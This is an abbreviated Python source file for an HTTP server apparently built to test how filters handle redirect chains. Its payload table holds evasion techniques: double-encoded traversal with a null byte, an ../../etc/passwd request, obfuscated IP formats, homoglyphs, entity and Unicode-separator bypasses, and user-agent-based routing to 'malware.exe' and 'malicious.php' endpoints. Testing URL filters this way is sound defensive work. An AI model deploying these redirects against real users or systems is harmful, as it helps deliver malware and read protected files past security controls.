...
SERVER_NAME = "RedirectTestServer 1"
...
PAYLOAD_CONFIG = {
    '/': {
        'technique': 'Index page for redirect server 1',
        'default_response': {'status': HTTPStatus.OK, 'headers': {'Content-Type': 'text/html'}, 'body': b'<html><body><h1>Redirect Server 1</h1><p>Handles first level redirects and evasion techniques.</p></body></html>'}
    },
    ...
    '/redirect1': {
        ...
        'default_response': {
            'redirect_to': 'http://192.168.2.70:5000/payload1?file=%252e%252e%252fmalicious.php%00'
        }
    },
    '/redirect2': {
        ...
        'ua_rules': [
            {
                ...
                'response': {
                    'redirect_to': 'ftp://well.vatrion.com/cGF5bG9hZDM'
                }
            },
            {
                'match': {'os': 'iOS', 'browser': 'Safari'},
                'response': {
                    'redirect_to': f'http://192.168.2.69:5001/redirect2?ios_special=1'
                }
            }
        ],
        'default_response': {
    ...
    '/redirect4': {
        ...
        'default_response': {
            'redirect_to': 'http://www.somesitethatshouldbetruncated:sdfsdfgadmin@192.168.2.70:5000/payload2?name=../../etc/passwd'
        }
    },
    
    # --- Additional Redirect Points based on payloads.txt ---
    '/redirect5': {
        'technique': 'Redirect using decimal IP and suspicious extension',
        'default_response': {
            'redirect_to': 'http://3232236137:5000/payload1?name=malware.exe'
        }
    },
    '/redirect6': {
        'technique': 'Redirect to S4 with cyrillic characters',
        'default_response': {
            'redirect_to': 'http://well.vatrion.com:5000/payload3?param=%D0%90'
        }
    },
    '/redirect7': {
        'technique': 'Redirect to S3 with binary IP',
        'default_response': {
            'redirect_to': 'http://11000000.10101000.00000010.01000101:5000/payload2'
        }
    },
    '/redirect8': {
        'technique': 'Redirect to second redirect server with multiple tricks',
        'default_response': {
            'redirect_to': 'http://192.168.2.69:5002/complex1?param=%252e%252e%252fsecret.txt'
        }
    },
    '/redirect9': {
        'technique': 'Redirect with HTML entity bypass',
        'default_response': {
            'redirect_to': 'http://192.168.2.70:5000/payload4?file=malware&amp;amp;.exe'
        }
    },
    '/redirect10': {
        'technique': 'Redirect with Unicode separator bypass',
        'default_response': {
            'redirect_to': 'http://well.vatrion.com:5000/payload3?file=malware%u2028.exe'
        }
    }
}
...
class ConfigurableExploitHandler(http.server.BaseHTTPRequestHandler):
    ...
    def do_GET(self):
        ...
        query_params = urllib.parse.parse_qs(parsed_url.query)
        config = PAYLOAD_CONFIG.get(path)
        # Special case: /redirect2?ios_special=1 for iOS Safari
        if path == '/redirect2' and query_params.get('ios_special', ['0'])[0] == '1':
            # Log and serve the iOS special redirect as per the chain
            logging.info("Special iOS Safari case: /redirect2?ios_special=1 detected, redirecting to octal IP payload2")
            self.send_response(HTTPStatus.FOUND)
            self.send_header('Location', 'http://0300.0250.0002.0105:5000/payload2')
            self.end_headers()
            self.wfile.write(b'Redirecting to octal IP payload2 for iOS Safari...')
            return
        if not config:
